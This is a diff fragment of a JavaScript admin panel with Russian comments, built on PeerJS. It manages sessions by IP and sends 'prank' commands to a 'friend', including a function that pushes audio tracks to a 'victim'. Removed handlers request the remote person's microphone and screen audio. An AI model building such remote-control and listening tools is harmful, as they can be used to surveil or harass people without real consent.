-        // Но PeerJS требует валидный ID. Используем сам ID друга? Мы его не знаем.
-        // Решение: шлём через data-канал команду, друг сам звонит.
-
-        // Сначала уведомляем друга командой
+        // Просим друга слушать
         s.conn.send({action: 'startVoiceListen'});
-
-        // Также пробуем прямой звонок — если у друга есть peer с авто-ID
-        // PeerJS даёт другу рандомный ID, мы его не знаем, поэтому полагаемся на data-канал.
 
         btn.classList.add('active', 'recording');
         btn.innerHTML = '🔴 Говорю... (нажми чтобы выключить)';
-        status.textContent = 'Микрофон активен';
-        status.className = 'voice-status on';
-        log('🎙 Микрофон включён, отправлена команда другу', 'info');
+        status.textContent = '⏳ Ждём подтверждения от друга...';
+        status.className = 'voice-status';
+        log('🎙 Микрофон включён, ждём друга', 'info');
     } catch(e) {
         alert('Не удалось получить микрофон: ' + e.message);
         log('❌ Микрофон: ' + e.message, 'err');
     }
-});
-
-document.getElementById('listenMicBtn').addEventListener('click', () => {
-    const btn = document.getElementById('listenMicBtn');
-    const status = document.getElementById('listenMicStatus');
-    if (!selectedIp) { alert('Выбери сессию'); return; }
-    sendPrank('requestMic');
-    btn.classList.toggle('active');
-    status.textContent = 'Запрос отправлен...';
-    status.className = 'voice-status';
-    log('🎤 Запрошен микрофон друга', 'warn');
-});
-
-document.getElementById('listenScreenBtn').addEventListener('click', () => {
-    const btn = document.getElementById('listenScreenBtn');
-    const status = document.getElementById('listenScreenStatus');
-    if (!selectedIp) { alert('Выбери сессию'); return; }
-    sendPrank('requestScreenAudio');
-    btn.classList.toggle('active');
-    status.textContent = 'Запрос отправлен...';
-    status.className = 'voice-status';
-    log('🖥 Запрошен экран+звук друга', 'warn');
 });
 
 /* ============================================================
@@ -707,7 +839,6 @@ document.getElementById('addUrlBtn').onclick = () => {
     const name = url.split('/').pop().split('?')[0] || 'Трек по URL';
     tracks.push({name, url, file: null});
     document.getElementById('mp3Url').value = '';
-    log('🎵 URL: ' + name, 'info');
     renderPlaylist();
     if (currentIdx === -1) selectTrack(0);
 };
@@ -780,8 +911,6 @@ async function sendTrackToVictim(idx) {
 }
 
 setInterval(renderSessions, 2000);
-
-// ЗАПУСК
 initPeer();
 log('⚙️ Админка запущена', 'info');
 </script>
